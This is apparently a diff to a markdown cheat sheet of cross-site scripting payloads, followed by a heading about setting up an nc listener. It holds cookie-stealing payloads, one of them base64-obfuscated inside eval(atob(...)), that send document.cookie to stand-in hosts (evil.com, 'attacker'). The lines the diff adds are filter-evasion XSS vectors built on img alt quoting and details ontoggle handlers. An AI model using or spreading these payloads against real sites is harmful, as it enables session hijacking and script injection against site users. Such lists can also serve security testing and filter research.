@@ -60,6 +60,9 @@ eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbTo4MDkwL3IucGhwP2M9Iitkb
 
 ```
 <svg onload=fetch("//attacker/r.php?="%2Bcookie)>
+<img alt="<a href="onclick=alert(4)//" src=x>">s</a>
+<details/open/ontoggle="a=alert;a`1`">
+<details/open/ontoggle="a=eval,b=alert,c=b`1`,a`b`">
 ```
 
 nc 监听：
